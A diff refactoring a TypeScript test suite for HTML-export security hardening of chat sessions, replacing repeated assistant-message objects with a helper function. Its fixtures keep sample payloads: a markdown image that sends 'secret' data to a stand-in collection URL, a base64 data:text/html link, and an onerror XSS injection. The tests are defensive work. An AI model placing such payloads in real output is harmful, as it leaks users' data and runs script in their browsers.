@@ -21,6 +21,10 @@ function makeMessage(id: string, parentId: string | null, message: unknown): Ses
   return makeEntry(id, parentId, { type: "message", message });
 }
 
+function makeAssistantTextEntry(id: string, parentId: string | null, text: string): SessionEntry {
+  return makeMessage(id, parentId, { role: "assistant", content: [{ type: "text", text }] });
+}
+
 function makeSession(
   id: string,
   entries: SessionEntry[],
@@ -382,15 +386,11 @@ describe("export html security hardening", () => {
     const session = makeSession(
       "session-4",
       [
-        makeMessage("1", null, {
-          role: "assistant",
-          content: [
-            {
-              type: "text",
-              text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
-            },
-          ],
-        }),
+        makeAssistantTextEntry(
+          "1",
+          null,
+          `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
+        ),
       ],
       "1",
     );
@@ -420,15 +420,11 @@ describe("export html security hardening", () => {
             '[safe](https://example.com/report "report")',
           ].join("\n"),
         }),
-        makeMessage("2", "1", {
-          role: "assistant",
-          content: [
-            {
-              type: "text",
-              text: "[data](data:text/html;base64,PGgxPnBvYzwvaDE+) [mail](mailto:test@example.com)",
-            },
-          ],
-        }),
+        makeAssistantTextEntry(
+          "2",
+          "1",
+          "[data](data:text/html;base64,PGgxPnBvYzwvaDE+) [mail](mailto:test@example.com)",
+        ),
         makeEntry("3", "2", {
           type: "branch_summary",
           summary: "[relative](./notes.md)",
@@ -471,10 +467,7 @@ describe("export html security hardening", () => {
       "session-xss-id",
       [
         makeMessage(xssId, null, { role: "user", content: "hello" }),
-        makeMessage("safe-child", xssId, {
-          role: "assistant",
-          content: [{ type: "text", text: "world" }],
-        }),
+        makeAssistantTextEntry("safe-child", xssId, "world"),
       ],
       "safe-child",
     );
@@ -531,15 +524,7 @@ describe("export html security hardening", () => {
     const session = makeSession(
       "session-6",
       [
-        makeMessage("1", null, {
-          role: "assistant",
-          content: [
-            {
-              type: "text",
-              text: `![x" onerror="alert(1)](${dataImage})`,
-            },
-          ],
-        }),
+        makeAssistantTextEntry("1", null, `![x" onerror="alert(1)](${dataImage})`),
       ],
       "1",
     );
